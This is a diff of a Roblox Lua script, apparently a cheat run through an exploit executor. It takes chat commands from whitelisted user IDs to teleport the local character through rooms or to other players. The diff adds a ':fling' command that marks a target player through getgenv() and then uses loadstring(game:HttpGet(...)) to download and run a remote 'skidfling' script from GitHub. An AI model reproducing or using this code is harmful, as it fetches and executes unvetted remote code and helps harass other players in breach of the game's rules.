@@ -2,10 +2,14 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
 local Ops = {[4089251764] = true}
-local isSkipping = false
+local skipping = false
 
-local character = LocalPlayer.Character
-local hrp = character
+local function GetRoot()
+	local character = LocalPlayer.Character
+	local hrp = character:WaitForChild("HumanoidRootPart")
+	
+	return hrp
+end
 
 local function Trim(s)
 	return s:match("^%s*(.-)%s*$")
@@ -63,11 +67,14 @@ end
 local function Skip(speaker, raw)
 	if not Ops[speaker.UserId] then return end
 	local numberRaw = Trim(raw:sub(7) or "")
+	
+	local hrp = GetRoot()
+	
 	local count = tonumber(numberRaw)
 	if not count then count = 1 end
-	isSkipping = true
+	skipping = true
 	for i = 1, count do
-		if not isSkipping then break end
+		if not skipping then break end
 		
 		local target = workspace:WaitForChild("LoadedRooms"):WaitForChild("RoomExit")
 		hrp.CFrame = target.CFrame
@@ -78,25 +85,17 @@ end
 
 local function Stop(speaker)
 	if not Ops[speaker.UserId] then return end
-	isSkipping = false
-end
-
-local function Say(speaker, raw)
-	if not Ops[speaker.UserId] then return end
-	local message = Trim(raw:sub(6) or "")
-	if message == "" then return end
-
-	local args = {[1] = message,[2] = "All"}
-	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
-
+	skipping = false
 end
 
 local function Bring(speaker, raw)
 	if not Ops[speaker.UserId] then return end
 	local arg = Trim(raw:sub(7) or "")
-
+	
+	local hrp = GetRoot()
+	
 	if arg == "" then
-		local targetHrp = speaker.Character and speaker.Character:FindFirstChild("HumanoidRootPart")
+		local targetHrp = speaker.Character:FindFirstChild("HumanoidRootPart")
 		if targetHrp then
 			hrp.CFrame = targetHrp.CFrame
 		end
@@ -105,13 +104,27 @@ local function Bring(speaker, raw)
 
 	local targetPlayer = GetPlayer(arg)
 	if not targetPlayer then return end
-	local targetHrp = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+	local targetHrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
 	if targetHrp then
 		hrp.CFrame = targetHrp.CFrame
 	end
 end
 
-local function onPlayerChatted(speaker, message)
+local function Fling(speaker, raw)
+	if not Ops[speaker.UserId] then return end
+	local targetRaw = Trim(raw:sub(5) or "")
+	
+	if targetRaw == "" then return end
+
+	local targetPlayer = GetPlayer(targetRaw)
+	if targetPlayer then
+		getgenv().Targets = {targetPlayer.Name}
+
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/1shibainu/Kaboom/refs/heads/main/skidfling"))()
+	end
+end
+
+local function PlayerChatted(speaker, message)
 	if message == ":stop" then
 		Stop(speaker)
 		return
@@ -128,24 +141,24 @@ local function onPlayerChatted(speaker, message)
 		Deop(speaker, message)
 		return
 	end
-	if message:sub(1,5) == ":say " or message == ":say" then
-		Say(speaker, message)
-		return
-	end
 	if message:sub(1,7) == ":bring " or message == ":bring" then
 		Bring(speaker, message)
 		return
 	end
+	if message:sub(1,7) == ":fling " or message == ":fling" then
+		Fling(speaker, message)
+		return
+	end
 end
 
-local function connectPlayer(player)
+local function Loader(player)
 	player.Chatted:Connect(function(msg)
-		onPlayerChatted(player, msg)
+		PlayerChatted(player, msg)
 	end)
 end
 
 for _, player in ipairs(Players:GetPlayers()) do
-	connectPlayer(player)
+	Loader(player)
 end
 
-Players.PlayerAdded:Connect(connectPlayer)
+Players.PlayerAdded:Connect(Loader)
